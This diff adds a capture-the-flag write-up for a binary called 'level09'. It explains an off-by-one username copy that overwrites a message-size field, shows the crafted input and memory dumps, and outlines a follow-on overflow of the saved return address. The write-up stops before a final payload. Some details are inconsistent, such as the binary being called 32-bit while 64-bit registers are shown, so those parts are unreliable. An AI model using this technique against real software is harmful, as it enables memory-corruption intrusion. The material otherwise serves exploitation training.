@@ -1,0 +1,94 @@
+1.	Program type:
+	Running the command `file ./level09` we see the file is 32-bit ELF
+	executable.
+	Running the command `checksec --file ./level09, we see that the stack is 
+	not executable (NX enabled) and there is a no stack canary (No canary found)
+    and PIE is enabled.
+
+2.  Content:
+    In `main` not much happens it just prints some header then a call to `handle_msg`.
+    
+    ```
+    8c4:	48 81 ec c0 00 00 00 	sub    rsp,0xc0
+    ```
+
+    In `handle_msg` we got a bit chuck of variables in the stack.
+    When we did put our thoughts into it and reading the rest of the disassembly code
+    we assumed that it was some kind of structure containing, a username buffer (0x28 size)
+    a message buffer (0x8c size) and message_size int value.
+
+    ```
+    typedef struct	s_msg_struct
+    {
+    	int		message_size;
+    	char	message[0x8c];
+    	char	username[0x28];
+    }				t_msg_struct;
+    ```
+
+    that assumption taken into consideration, using some kind of `bezero` it nullify the
+    username buffer.
+
+    the we assign the value "0x8c" to the message_size variable then we call the function
+    `set_username` passing a apointer to the structure.
+
+    Inside `set_username` we got a call to puts and printf to put the context,
+
+    then a call to `fgets` that fills an internal username buffer with 0x80 bytes
+
+    then in while loop it puts the content of the internal username buffer in
+    the structure's username buffer, copying 0x29 character at max.
+
+    In main after the call to `set_username` we got a call to `set_message` with
+    the structure pointer as a parameter.
+
+    As it name suggests `set_msg` just sets a message inside our sturcture, like
+    set_username it got some calls to `printf` and `puts` to put context, using `fgets`
+    it reads 0x400 bytes from the standard input and fills it internal buffer.
+
+    It uses the variable message_size as a parameter to `strncpy` for it to write in the
+    structure's message buffer.
+
+3. Solution:
+    The big mistake that the person who made the programme did is to put copy at most 0x29
+    bytes from the username passed into parameter, as a reminder the username buffer
+    is only 0x28 long so by passing 0x29 bytes username we effectively overwrite the byte
+    positioned after the username and luckily for us (quite unlucky for the programmer)
+    that byte is the start of the message_size variable !
+
+    This how the structure looked in the stack before `set_username`
+    
+    ```
+    0x7fffffffe4c0:	0x0000000a	0x00000000	0x55554c69	0x00005555
+    0x7fffffffe4d0:	0xf7ff7000	0x00007fff	0xf7a94713	0x00007fff
+    0x7fffffffe4e0:	0xf7dd4260	0x00007fff	0xf7dd4260	0x00007fff
+    0x7fffffffe4f0:	0x0000000a	0x00000000	0xf7ff7000	0x00007fff
+    0x7fffffffe500:	0x0000002d	0x00000000	0xf7a945da	0x00007fff
+    0x7fffffffe510:	0x00000086	0x00000000	0x0000002d	0x00000000
+    0x7fffffffe520:	0x0000000a	0x00000000	0x55554c10	0x00005555
+    0x7fffffffe530:	0xffffe670	0x00007fff	0xf7a95d45	0x00007fff
+    0x7fffffffe540:	0xf7dd4260	0x00007fff	0xf7a9608f	0x00000000
+    0x7fffffffe550:	0x00000000	0x00000000	0x00000000	0x00000000
+    0x7fffffffe560:	0x00000000	0x00000000	0x00000000	0x00000000
+    0x7fffffffe570:	0x00000000	0x0000008c <--- This is what we want to modify
+    ```
+
+    After entering "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB"
+
+    ```
+    0x7fffffffe4c0:	0x0000000a	0x00000000	0x55554c69	0x00005555
+    0x7fffffffe4d0:	0xf7ff7000	0x00007fff	0xf7a94713	0x00007fff
+    0x7fffffffe4e0:	0xf7dd4260	0x00007fff	0xf7dd4260	0x00007fff
+    0x7fffffffe4f0:	0x0000000a	0x00000000	0xf7ff7000	0x00007fff
+    0x7fffffffe500:	0x0000002d	0x00000000	0xf7a945da	0x00007fff
+    0x7fffffffe510:	0x00000086	0x00000000	0x0000002d	0x00000000
+    0x7fffffffe520:	0x0000000a	0x00000000	0x55554c10	0x00005555
+    0x7fffffffe530:	0xffffe670	0x00007fff	0xf7a95d45	0x00007fff
+    0x7fffffffe540:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141
+    0x7fffffffe550:	0x41414141	0x41414141	0x41414141	0x41414141
+    0x7fffffffe560:	0x41414141	0x41414141	0x41414141	0x41414141
+    0x7fffffffe570:	0x41414141	0x00000042	<--- We modified it !
+    ```
+    So all what we will have to do is to specify a new size that will enable us to
+    overwrite the saved eip of the function `handle_msg` using `set_msg`
+    and luckly for us isn't that far (we can only write 255 byte as a max).
